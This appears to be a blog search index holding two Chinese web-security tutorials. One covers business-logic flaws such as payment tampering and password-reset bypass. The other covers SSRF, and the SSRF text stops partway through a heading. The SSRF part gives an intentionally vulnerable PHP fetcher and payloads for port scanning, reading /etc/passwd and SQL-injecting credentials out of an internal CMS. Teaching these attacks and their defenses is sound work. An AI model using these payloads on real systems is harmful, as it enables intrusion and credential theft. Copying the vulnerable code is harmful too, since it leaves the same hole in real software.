<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>业务安全</title>
      <link href="/2022/11/28/%E6%BC%8F%E6%B4%9E/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/"/>
      <url>/2022/11/28/%E6%BC%8F%E6%B4%9E/%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="业务安全"><a href="#业务安全" class="headerlink" title="业务安全"></a>业务安全</h1><p>关于漏洞：</p><ul><li>注入</li><li>业务逻辑</li><li>信息泄露</li></ul><h1 id="1-业务安全概述"><a href="#1-业务安全概述" class="headerlink" title="1.业务安全概述"></a>1.业务安全概述</h1><h3 id="1-1-业务安全现状"><a href="#1-1-业务安全现状" class="headerlink" title="1.1 业务安全现状"></a>1.1 业务安全现状</h3><h4 id="1-1-1-业务逻辑漏洞"><a href="#1-1-1-业务逻辑漏洞" class="headerlink" title="1.1.1 业务逻辑漏洞"></a>1.1.1 业务逻辑漏洞</h4><ul><li><p>近年来，随着信息化技术的迅速发展和全球一体化进程的不断加快，计算机和网络已经成为与所有人都息息相关的工具和媒介，个人的工作、生活和娱乐，企业的管理，乃至国家的发展和改革都无处其外。信息和互联网带来的不仅仅是便利和高效，大量隐私、敏感和高价值的信息数据和资产，成为恶意攻击者攻击和威胁的主要目标，从早期以极客为核心的黑客黄金时代，到现在利益链驱动的庞大黑色产业，网络安全已经成为任何个人、企业、组织和国家所必须面临的重要问题。网络安全和信息化是事关国家安全和国家发展、事关广大人民群众工作生活的重大战略问题，没有网络安全就没有国家安全，没有信息化就没有现代化。”</p></li><li><p>随着互联网+的发展，经济形态不断地发生演变。众多传统行业逐步地融入互联网并利用信息通信技术以及互联网平台进行着频繁的商务活动，这些平台（如银行、保险、证券、电商、P2P、O2O、游戏、社交、招聘、航空等)由于涉及大量的金钱、个人信息、交易等重要隐私数据，成为了黑客攻击的首要目标，而因为开发人员安全意识淡薄（只注重实现功能而忽略了在用户使用过程中个人的行为对Wb应用程序的业务逻辑功能的安全性影响)、开发代码频繁迭代导致这些平台业务逻辑层面的安全风险层出不穷。</p></li><li><p>业务逻辑漏洞主要是开发人员业务流程设计的缺陷，不仅限于网络层、系统层、代码层等。比如登录验证的绕过、交易的数据篡改、接口的恶意调用等，都属于业务逻辑漏洞。</p></li></ul><h4 id="1-1-2-黑客攻击目标"><a href="#1-1-2-黑客攻击目标" class="headerlink" title="1.1.2 黑客攻击目标"></a>1.1.2 黑客攻击目标</h4><ul><li><p>一方面随着社会和科技的发展，购物、社交、P2P、O2O、游戏、招聘等业务纷纷具备了在线支付功能。如电商支付系统保存了用户手机号、姓名、家庭住址，包括支付的银行卡信息、支付密码信息等，这些都是黑客感兴趣的敏感信息。攻击者可以利用程序员的设计缺陷进行交易数据篡改、敏感信息盗取、资产的窃取等操作。现在的黑客不在以炫耀技能为主要攻击目的，而主要以经济利益为目的，攻击的目的逐渐转变为趋利化。</p></li><li><p>另一方面，如今的业务系统对于传统安全漏洞防护的技术、设备和开发框架越来越成熟，基于传统漏洞入侵也变得越来越困难，增加了黑客攻击的成本。而业务逻辑漏洞可以逃逸各种安全防护，迄今为止没有很好的解决办法。也是为什么黑客偏好使用业务逻辑漏洞攻击的一个原因。</p></li><li><p>为了解决业务安全所带来的风险，所以要对业务安全进行审计。</p></li></ul><h1 id="2-业务安全测试"><a href="#2-业务安全测试" class="headerlink" title="2.业务安全测试"></a>2.业务安全测试</h1><h3 id="2-1-业务安全测试流程"><a href="#2-1-业务安全测试流程" class="headerlink" title="2.1 业务安全测试流程"></a>2.1 业务安全测试流程</h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20231013215510910.png" alt="image-20231013215510910"></p><h4 id="2-1-1-测试准备"><a href="#2-1-1-测试准备" class="headerlink" title="2.1.1 测试准备"></a>2.1.1 测试准备</h4><p>准备阶段主要包括对业务系统的前期熟悉工作，以了解被测试业务系统的数量、规模和场景等内容。</p><ul><li>针对白盒测试，可以结合相关开发文档去熟悉相关系统的业务。</li><li>针对黑盒测试，可通过实际操作还原业务流程的方式理解业务。</li></ul><h4 id="2-1-2-业务调研"><a href="#2-1-2-业务调研" class="headerlink" title="2.1.2 业务调研"></a>2.1.2 业务调研</h4><ul><li>业务调研阶段主要针对业务系统相关负责人进行访谈调研，了解业务系统的整体情况，包括部署情况、功能模块、业务流程、数据流、业务逻辑以及现有的安全措施等内容。根据以往测试实施经验，在业务调研前可先设计访谈问卷，访谈后可能会随着对客户业务系统具体情况了解的深入而不断调整、更新问卷(黑盒测试此步骤可忽略)。</li></ul><h4 id="2-1-3-业务建模"><a href="#2-1-3-业务建模" class="headerlink" title="2.1.3 业务建模"></a>2.1.3 业务建模</h4><ul><li>针对不同行业、不同平台的业务系统，如电商、银行、金融、证券、保险、游戏、社交、招聘等业务系统，识别出其中的高风险业务场景进行建模。</li></ul><p>以电商系统为例：</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20231013215626472.png" alt="image-20231013215626472"></p><h4 id="2-1-4-业务流程梳理"><a href="#2-1-4-业务流程梳理" class="headerlink" title="2.1.4 业务流程梳理"></a>2.1.4 业务流程梳理</h4><p>业务模块的流程梳理主要遵循以下原则：</p><ul><li><p>区分业务主流程和分⽀流程，业务梳理⼯作是围绕主流程进⾏分析的，而主流程一定是核⼼业务流程，业务流程重点梳理的对象⾸先应放在核⼼主流程上，务必梳理出业务关键环节。</p></li><li><p>概括归纳业务分⽀流程，业务分⽀流程往往存在通⽤点，可将具有业务相似性的分⽀流程归纳成某一类型的业务流程，⽆须单独对其进⾏测试。</p></li><li><p>识别业务流程数据信息流，特别是业务数据流在交互⽅双⽅之间传输的先后顺序、路径等。</p></li><li><p>识别业务数据流功能字段，识别数据流中包含的重要程度不等的信息，理解这些字段的含义有助于下阶段⻛险点分析。</p></li></ul><h4 id="2-1-5-业务风险点识别"><a href="#2-1-5-业务风险点识别" class="headerlink" title="2.1.5 业务风险点识别"></a>2.1.5 业务风险点识别</h4><ul><li><p>在完成前期不同维度的业务流程梳理⼯作后，针对前台业务应着重关注⽤⼾界⾯操作每一步可能的逻辑⻛险和技术⻛险；针对后台业务应着重关注数据安全、数据流转及处理的⽇志和审计。</p></li><li><p>业务⻛险点识别应主要关注以下安全⻛险内容。</p></li><li><p>业务环节存在的安全⻛险，业务环节存在的安全⻛险指的是业务使⽤者可⻅的业务存在的安全⻛险，如注册、登录和密码找回等⾝份认证环节，是否存在完善的验证码机制、数据一致性校验机制、Session 和Cookie 校验机制等，是否能规避验证码绕过、暴⼒破解和SQL 注⼊等漏洞。</p></li><li><p>⽀持系统存在的安全⻛险，⽀持系统存在的安全⻛险，如⽤⼾访问控制机制是否完善，是否存在⽔平越权或垂直越权漏洞。系统内加密存储机制是否完善，业务数据是否明⽂传输。系统使⽤的业务接口是否可以未授权访问或调⽤，是否可以调⽤重放、遍历，接口调⽤参数是否可篡改等。</p></li><li><p>业务环节间存在的安全⻛险，业务环节间存在的安全⻛险，如系统业务流程是否存在乱序，导致某个业务环节可绕过、回退，或某个业务请求可以⽆限重放。业务环节间传输的数据是否有一致性校验机制，是否存在业务数据可被篡改的⻛险。</p></li><li><p>⽀持系统间存在的安全⻛险，⽀持系统间存在的安全⻛险，如系统间数据传输是否加密、系统间传输的参数是否可篡改。系统间输⼊参数的过滤机制是否完善，是否可能导致SQL 注⼊、XSS 跨站脚本和代码执⾏漏洞。</p></li><li><p>业务环节与⽀持系统间存在的安全⻛险，业务环节与⽀持系统间存在的⻛险，如数据传输是否加密、加密⽅式是否完善，是否采⽤前端加密、简单MD5 编码等不安全的加密⽅式。系统处理多线程并发请求的机制是否完善，服务端逻辑与数据库读写是否存在时序问题，导致竞争条件漏洞。系统间输⼊参数的过滤机制是否完善。</p></li></ul><h4 id="2-1-6-开展测试"><a href="#2-1-6-开展测试" class="headerlink" title="2.1.6 开展测试"></a>2.1.6 开展测试</h4><p>对前期业务流程梳理和识别出的⻛险点，进⾏有针对性的测试。</p><h4 id="2-1-7-撰写报告"><a href="#2-1-7-撰写报告" class="headerlink" title="2.1.7 撰写报告"></a>2.1.7 撰写报告</h4><p>针对业务安全测试过程中发现的⻛险结果进⾏评价和建议，综合评价利⽤场景的⻛险程度和造成影响的严重程度，最终完成测试报告的编写。</p><h1 id="3-业务安全经典场景"><a href="#3-业务安全经典场景" class="headerlink" title="3.业务安全经典场景"></a>3.业务安全经典场景</h1><h3 id="3-1-业务数据安全"><a href="#3-1-业务数据安全" class="headerlink" title="3.1 业务数据安全"></a>3.1 业务数据安全</h3><h4 id="3-1-1-商品支付金额篡改"><a href="#3-1-1-商品支付金额篡改" class="headerlink" title="3.1.1 商品支付金额篡改"></a>3.1.1 商品支付金额篡改</h4><p>典型案例：</p><p>1毛钱买电冰箱</p><ul><li><p>电商类网站在业务流程整个环节， 需要对业务数据的完整性和一致性进行保护，特别是确保在用户客户端与服务端、业务系统接口之间的数据传输的一致性，通常在订购类交易流程中，容易出现服务器端未对用户提交的业务数据进行强制校验，过度信赖客户端提交的业务数据而导致的商品金额篡改漏洞。商品金额篡改测试，通过抓包修改业务流程中的交易金额等字段，例如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。</p></li><li><p>该项测试主要针对订单生成的过程中存在商品支付金额校验不完整而产生业务安全风险点，通常导致攻击者用实际支付远低于订单支付的金额订购商品的业务逻辑漏洞。</p></li></ul><h4 id="3-1-2-前端JS限制绕过"><a href="#3-1-2-前端JS限制绕过" class="headerlink" title="3.1.2 前端JS限制绕过"></a>3.1.2 前端JS限制绕过</h4><p>典型案例：</p><ul><li>绕过JS 限制，购买多个打折商品</li></ul><p>很多商品在限制⽤⼾购买数量时，Web 应⽤仅在⻚⾯通过JS 脚本限制，未在服务器端校验⽤⼾提交的数量，通过抓取客⼾端发送的请求包修改JS端⽣成处理的交易数据，如将请求中的商品数量改为⼤于最⼤数限制的值，查看能否以⾮正常业务交易数据完成业务流程。</p><ul><li>该项测试主要针对电商平台由于交易限制机制不严谨、不完善而导致的一些业务逻辑问题。例如，在促销活动中限制商品购买数量，却未对数量进⾏前、后端严格校验，往往被攻击者所利⽤，购买多个促销商品，造成商家的损失。</li></ul><h4 id="3-1-3-请求存放测试"><a href="#3-1-3-请求存放测试" class="headerlink" title="3.1.3 请求存放测试"></a>3.1.3 请求存放测试</h4><p>典型案例：</p><ul><li>一次购买，多次收货</li></ul><p>请求重放漏洞是电商平台业务逻辑漏洞中一种常⻅的由设计缺陷所引发的漏洞，通常情况下所引发的安全问题表现在商品⾸次购买成功后，参照订购商品的正常流程请求，进⾏完全模拟正常订购业务流程的重放操作，可以实现“一次购买，多次收货” 等违背正常业务逻辑的结果。</p><ul><li>该项测试主要针对电商平台订购兑换业务流程中对每笔交易请求的唯一性判断缺乏有效机制的业务逻辑问题，通过该项测试可以验证交易流程中随机数、时间戳等⽣成机制是否正常。</li></ul><h4 id="3-1-4-业务上限测试"><a href="#3-1-4-业务上限测试" class="headerlink" title="3.1.4 业务上限测试"></a>3.1.4 业务上限测试</h4><p>典型案例：</p><ul><li>⽆限制查询历史消费记录。</li></ul><p>业务上限测试主要是针对一些电商类应⽤程序在进⾏业务办理流程中，服务端没有对⽤⼾提交的查询范围、订单数量、⾦额等数据进⾏严格校验而引发的一些业务逻辑漏洞。通常情况下，在业务流程中通过向服务端提交⾼于或低于预期的数据以校验服务端是否对所提交的数据做预期强校验。存在此类脆弱性的应⽤程序，通常表现为查询到超出预期的信息、订购或兑换超出预期范围的商品等。</p><h4 id="3-1-5-商品订购数量篡改"><a href="#3-1-5-商品订购数量篡改" class="headerlink" title="3.1.5 商品订购数量篡改"></a>3.1.5 商品订购数量篡改</h4><p>典型案例：</p><ul><li>damicms_5.4_⽹上商城任意商品购买</li></ul><p>商品数量篡改测试是通过在业务流程中抓包修改订购商品数量等字段，如将请求中的商品数量修改成任意⾮预期数额、负数等进⾏提交，查看业务系统能否以修改后的数量完成业务流程。</p><ul><li>该项测试主要针对商品订购的过程中对异常交易数据处理缺乏⻛控机制而导致相关业务逻辑漏洞，例如针对订购中的数量、价格等缺乏判断而产⽣意外的结果，往往被攻击者利⽤。</li></ul><h3 id="3-2-密码找回安全"><a href="#3-2-密码找回安全" class="headerlink" title="3.2 密码找回安全"></a>3.2 密码找回安全</h3><p>用户提交修改密码请求。</p><ul><li>账号认证：服务器发送唯一D(例如短信验证码)只有账户所有者才能看的地方，完成身份验证。</li><li>身份验证：用户提交验证码完成身份验证。</li><li>修改密码：用户修改密码。</li></ul><h4 id="3-2-1-验证码客户端回显测试"><a href="#3-2-1-验证码客户端回显测试" class="headerlink" title="3.2.1 验证码客户端回显测试"></a>3.2.1 验证码客户端回显测试</h4><p>典型场景：</p><ul><li>任意用户登录</li></ul><p>使用验证码的场景：</p><ul><li>人机验证：防止机器操作，爆破表单。</li><li>唯一凭据：唯一性判断，任意账户登录。</li><li>找回密码测试中要注意验证码是否会回显在响应中，有些网站程序会选择将验证码回显在响应中，来判断用户输入的验证码是否和响应中的验证码一致，如果一致就会通过校验。</li></ul><h4 id="3-2-2-验证暴力破解"><a href="#3-2-2-验证暴力破解" class="headerlink" title="3.2.2 验证暴力破解"></a>3.2.2 验证暴力破解</h4><p>典型案例：</p><ul><li>验证码⽆使⽤次数限制</li></ul><p>找回密码功能模块中通常会将⽤⼾凭证（一般为验证码）发送到⽤⼾⾃⼰才可以看到的⼿机号或者邮箱中，只要⽤⼾不泄露⾃⼰的验证码就不会被攻击者利⽤，但是有些应⽤程序在验证码发送功能模块中验证码位数及复杂性较弱，也没有对验证码使⽤次数做限制而导致验证码可被暴⼒枚举并修改任意⽤⼾密码。</p><p>在测试验证码是否可以被暴⼒枚举时，可以先将验证码多次发送给⾃⼰的账号，观察验证码是否有规律，如每次接收到的验证码为纯数字并且是4位数。</p><h4 id="3-2-3-Response-状态值修改测试"><a href="#3-2-3-Response-状态值修改测试" class="headerlink" title="3.2.3 Response 状态值修改测试"></a>3.2.3 Response 状态值修改测试</h4><p>Response 状态值修改测试，即修改请求的响应结果来达到密码重置的⽬的，存在这种漏洞的⽹站或者⼿机App 往往因为校验不严格而导致了⾮常危险的重置密码操作。</p><p>这种漏洞的利⽤⽅式通常是在服务端发送某个密码重置的凭证请求后，出现特定的响应值，⽐如：</p><ul><li>true</li><li>1</li><li>ok</li><li>success</li><li>200</li><li>…</li></ul><p>⽹站看到回显内容为特定值后即修改密码或者登陆，通常这种漏洞的回显值校验是在客⼾端进⾏的，所以只需要修改服务器的响应数据包即可。</p><h4 id="3-2-4-Session覆盖"><a href="#3-2-4-Session覆盖" class="headerlink" title="3.2.4 Session覆盖"></a>3.2.4 Session覆盖</h4><p>Session ID 也叫会话ID，服务器对浏览器客⼾端⽤⼾⾝份进⾏唯一性标志。</p><p>找回密码逻辑漏洞测试中也会遇到参数不可控的情况，⽐如要修改的⽤⼾名或者绑定的⼿机号⽆法在提交参数时修改，服务端通过读取当前session 会话来判断要修改密码的账号，这种情况下能否对session 中的内容做修改以达到任意密码重置的⽬的呢？</p><p>在某⽹站中的找回密码功能中，业务逻辑是：由⽤⼾使⽤⼿机进⾏密码重置，然后服务端向⼿机发送验证码短信，⽤⼾输⼊验证码提交后，进⼊密码重置⻚⾯。</p><p>对⽹站中Session 覆盖的测试如下：</p><ul><li><p>打开浏览器，访问重置密码⻚⾯，并提交⾃⼰的⼿机号（133），同时浏览器接收Session ID；</p></li><li><p>⽤⾃⼰的账号（⼿机号，133）接收凭证（短信验证码）；</p></li><li><p>获得凭证校验成功后，进⼊密码重置⻚⾯；</p></li><li><p>在浏览器新标签重新打开找回密码⻚⾯，输⼊⽬标⼿机号(177)，此时服务器就会重新下发Session ID；</p></li><li><p>此时当前SessionID 已经被覆盖，重新回到第三步中打开的重置密码⻚⾯即可重置⽬标⼿机号密码。</p></li></ul><p>漏洞原因：</p><p>在验证码校验之后，没有及时更新Session ID，或者没有及时更新服务器端SESSION 信息。SessionID 不仅要与⼿机号绑定，还要与验证码绑定。</p><h4 id="3-2-5-弱Token设计缺陷测试"><a href="#3-2-5-弱Token设计缺陷测试" class="headerlink" title="3.2.5 弱Token设计缺陷测试"></a>3.2.5 弱Token设计缺陷测试</h4><p>在找回密码功能中，很多⽹站会向⽤⼾邮箱发送找回密码⻚⾯链接。⽤⼾只需要进⼊邮箱，打开找回密码邮件中的链接，就可以进⼊密码重置⻚⾯了。找回密码的链接通常会加⼊校验参数来确认链接的有效性，通过校验参数的值与数据库⽣成的值是否一致来判断当前找回密码的链接是否有效。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/findpwd?uid=ajest&amp;token=ajest-2021-1026-1324</span><br></pre></td></tr></table></figure><h4 id="3-2-6-密码找回流程绕过测试"><a href="#3-2-6-密码找回流程绕过测试" class="headerlink" title="3.2.6 密码找回流程绕过测试"></a>3.2.6 密码找回流程绕过测试</h4><p>很多⽹站的密码找回功能一般有以下⼏个步骤：</p><ul><li><p>⽤⼾输⼊找回密码的账号；</p></li><li><p>校验凭证：向⽤⼾发送短信验证码或者找回密码链接，⽤⼾回填验证码或单击链接进⼊密码重置⻚⾯，以此⽅式证明当前操作⽤⼾是账号主⼈；</p></li><li><p>校验成功进⼊重置密码⻚⾯（接口）。</p></li></ul><p>在找回密码逻辑中，第⼆步校验凭证最为重要。不是账号主⼈是⽆法收到校验凭证的，试想有没有办法可以绕过第⼆步凭证校验，直接进⼊第三步重置密码呢？</p><p>⽤⼾修改密码需要向服务器发送修改密码请求，服务器通过后再修改数据库中相应的密码，所以在测试中我们⾸先要收集三个步骤的请求接口，重点是收集到最后一步重置密码的接口，这样我们可以直接跳过凭证校验的接口去尝试直接重置密码。</p><h4 id="3-2-7-接口参数账号修改"><a href="#3-2-7-接口参数账号修改" class="headerlink" title="3.2.7 接口参数账号修改"></a>3.2.7 接口参数账号修改</h4><p>典型案例：</p><ul><li>metinfo_4.0 任意账号密码重置</li></ul><p>找回密码功能逻辑中常常会在⽤⼾修改密码的接口提交的参数中存在传递⽤⼾账号的参数，而⽤⼾账号参数作为一个可控变量是可以被篡改的，从而导致修改账号密码的凭证或修改的⽬标账号出现偏差，最终造成任意账号密码修改的漏洞。</p><p>通常在找回密码逻辑中，服务端会要求⽤⼾提供要修改的账号，然后给这个账号发送只有账号主⼈才能看到的凭证。⽐如给这个账号主⼈绑定的邮箱或者⼿机号发送验证码，或者找回密码链接，这样可以保证只有账号主⼈才可以看到这些凭证。但是如果服务器对账号的控制逻辑不当，就会导致原有账号被篡改为其他账号，服务器端把凭证发送给篡改后的账号的邮箱或⼿机，最终造成可利⽤凭证重置任意账号密码的漏洞。</p><p>接口参数账号修改流程测试为拦截前端请求，通过修改请求内的账号ID 、名称或者邮箱、⼿机号等参数，将修改后的数据发送给服务器进⾏欺骗达到密码重置的⽬的。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>服务器请求伪造（SSRF）</title>
      <link href="/2022/11/27/%E6%BC%8F%E6%B4%9E/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/"/>
      <url>/2022/11/27/%E6%BC%8F%E6%B4%9E/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1、SSRF-概述"><a href="#1、SSRF-概述" class="headerlink" title="1、SSRF 概述"></a>1、<strong>SSRF</strong> 概述</h1><p>服务器会根据用户提交的URL 发送一个HTTP 请求。使用用户指定的URL，Web 应用可以获取图片或者文件资源等。</p><p>如果没有对用户提交URL 和远端服务器所返回的信息做合适的验证或过滤，就有可能存在“请求伪造”的缺陷。“请求伪造”，顾名思义，攻击者伪造正常的请求，以达到攻击的目的。如果“请求伪造”发生在服务器端，那这个漏洞就叫做“服务器端请求伪造”，英文名字Server Side Request Forgery，简称SSRF。</p><p>SSRF 是一种由攻击者发起的伪造服务器发送的请求的一种攻击。</p><h3 id="1-1-SSRF-场景"><a href="#1-1-SSRF-场景" class="headerlink" title="1.1 SSRF 场景"></a>1.1 SSRF 场景</h3><p>SSRF漏洞主要出现在需要从服务器向其他资源发送请求的应用程序中，例如图片处理、文件下载、URL 转发等。其中被攻击的目标系统通常位于服务器的内部网络。</p><h4 id="1-1-1-PHP-实现"><a href="#1-1-1-PHP-实现" class="headerlink" title="1.1.1 PHP 实现"></a>1.1.1 PHP 实现</h4><p>利用curl实现，需要PHP扩展组件curl支持</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$link</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$fileName</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&quot;.txt&quot;</span>;<span class="comment"># 在curled目录下新建一个文件，将请求到的内容放到该文件中。</span></span><br><span class="line">        <span class="variable">$curlObj</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$link</span>);<span class="comment"># 初始化</span></span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$fileName</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlObj</span>,CURLOPT_FILE,<span class="variable">$fp</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlObj</span>,CURLOPT_HEADER,<span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlObj</span>,CURLOPT_FOLLOWLOCATION,<span class="literal">TRUE</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlObj</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlObj</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$fileName</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:image/png&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$fileName</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$fileName</span>));</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;?url=[url]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-2-SSRF-原理"><a href="#1-2-SSRF-原理" class="headerlink" title="1.2 SSRF 原理"></a>1.2 SSRF 原理</h3><ul><li><p>服务器接受了来自于客户端的URL 地址，并由服务器发送该URL 请求。</p></li><li><p>对用户输入的URL 没有进行恰当的过滤，导致任意URL 输入。</p></li><li><p>没对响应的结果进行检验，直接输出。</p></li></ul><h3 id="1-3-SSRF-危害"><a href="#1-3-SSRF-危害" class="headerlink" title="1.3 SSRF 危害"></a>1.3 SSRF 危害</h3><p>漏洞危害：</p><ul><li>内部资产暴露：攻击者可以通过伪造的请求访问内部资源，包括数据库、文件系统、配置文件、读取本地文件等。</li><li>敏感信息泄露：攻击者可以利用该漏洞获取敏感信息，例如访问受限 API、执行未经授权的操作等。</li><li>进行攻击：攻击者可以通过伪造的请求向其他系统发起攻击，例如内网端口扫描、攻击内网应用、内网Web应用指纹识别、利用其他漏洞等。</li></ul><h1 id="2、SSRF-攻防"><a href="#2、SSRF-攻防" class="headerlink" title="2、SSRF 攻防"></a>2、SSRF 攻防</h1><h3 id="2-1-SSRF-利用"><a href="#2-1-SSRF-利用" class="headerlink" title="2.1 SSRF 利用"></a>2.1 SSRF 利用</h3><h4 id="2-1-1-文件访问"><a href="#2-1-1-文件访问" class="headerlink" title="2.1.1 文件访问"></a>2.1.1 文件访问</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www.baidu.com </span><br><span class="line">?url=http://www.baidu.com/img/bd_logo.png </span><br><span class="line">?url=http://www.baidu.com/robots.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-1-2-端口扫描"><a href="#2-1-2-端口扫描" class="headerlink" title="2.1.2 端口扫描"></a>2.1.2 端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.1:80 </span><br><span class="line">?url=http://127.0.0.1:3306 </span><br><span class="line">?url=dict://127.0.0.1:3306</span><br><span class="line">?url=http://10.10.10.1:22 </span><br><span class="line">?url=http://10.10.10.1:6379</span><br></pre></td></tr></table></figure><h4 id="2-1-3-读取本地文件"><a href="#2-1-3-读取本地文件" class="headerlink" title="2.1.3 读取本地文件"></a>2.1.3 读取本地文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file:///c:/windows/system32/drivers/etc/hosts </span><br><span class="line">?url=file:///etc/passwd</span><br><span class="line"></span><br><span class="line">?url=file:/c:/www/ssrf/ssrf_curl.php</span><br></pre></td></tr></table></figure><h4 id="2-1-4-内网应用指纹识别"><a href="#2-1-4-内网应用指纹识别" class="headerlink" title="2.1.4 内网应用指纹识别"></a>2.1.4 内网应用指纹识别</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &quot;c:\phpstudy_2016\www\phpMyAdmin&quot;&gt; </span><br><span class="line">    #Order allow,deny</span><br><span class="line">Order deny,allow </span><br><span class="line">    deny from all# 拒绝所有</span><br><span class="line">allow from 127.0.0.1# 只允许本机</span><br><span class="line"></span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><h4 id="2-1-5-攻击内网Web应用"><a href="#2-1-5-攻击内网Web应用" class="headerlink" title="2.1.5 攻击内网Web应用"></a>2.1.5 攻击内网Web应用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory &quot;c:\phpstudy_2016\www\cms&quot;&gt;</span><br><span class="line">#Order allow,deny </span><br><span class="line">Order deny,allow </span><br><span class="line">deny from all</span><br><span class="line">allow from 127.0.0.1</span><br><span class="line"></span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>通过SSRF 漏洞可以实现对内网的访问，从而可以攻击内网应用。仅仅通过GET 方法可以攻击的内网Web 应用有很多。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.1/cms/show.php?</span><br><span class="line">id=-33/*A*/union/*J*/select/*E*/1,2,3,4,5,6,7,8,9,10,concat(username,0x3a,password),12,13,14,15/*S*/from/*T*/cms_ users</span><br><span class="line"></span><br><span class="line">?url=http://127.0.0.1/cms/show.php?</span><br><span class="line">id=-33%25%32%30union%25%32%30select%25%32%301,2,3,4,5,6,7,8,9,10,concat(username,0x3a,password),12,13,14,15%25%32</span><br><span class="line">%30from%25%32%30cms_users</span><br></pre></td></tr></table></figure><h3 id="2-2-SSRF-防御"><a href="#2-2-SSRF-防御" class="headerlink" title="2.2 SSRF 防御"></a>2.2 <strong>SSRF</strong> 防御</h3><h4 id="2-1-1-过滤输入"><a href="#2-1-1-过滤输入" class="headerlink" title="2.1.1  过滤输入"></a><strong>2.1.1</strong>  <strong>过滤输入</strong></h4><ul><li><p>限制协议，仅允许 http  或 https  协议；</p></li><li><p>限制IP，避免应用被用来获取内网数据，攻击内网；限制端口，限制请求端口为常用端口。</p></li></ul><h4 id="2-1-2-过滤输出"><a href="#2-1-2-过滤输出" class="headerlink" title="2.1.2  过滤输出"></a><strong>2.1.2</strong>  <strong>过滤输出</strong></h4><ul><li><p>过滤返回信息，只要不符合要求的，全部过滤；</p></li><li><p>统一错误信息，让攻击无法对内网信息进行判断。</p></li></ul><h4 id="2-3-3-内部网络隔离"><a href="#2-3-3-内部网络隔离" class="headerlink" title="2.3.3 内部网络隔离"></a>2.3.3 内部网络隔离</h4><p>将服务器与内部资源隔离开，并使用防火墙等措施限制对内部网络的访问。</p><h4 id="2-3-4-授权验证和访问控制"><a href="#2-3-4-授权验证和访问控制" class="headerlink" title="2.3.4 授权验证和访问控制"></a>2.3.4 授权验证和访问控制</h4><p>实施严格的授权验证和访问控制机制，确保仅授权用户可以访问受限资源。</p><h4 id="2-3-5-安全编码实践"><a href="#2-3-5-安全编码实践" class="headerlink" title="2.3.5 安全编码实践"></a>2.3.5 安全编码实践</h4><p>开发人员应遵循安全编码指南，进行输入验证和输出编码，以减少漏洞发生的可能性。</p><h1 id="3、SSRF-挖掘"><a href="#3、SSRF-挖掘" class="headerlink" title="3、SSRF 挖掘"></a>3、SSRF 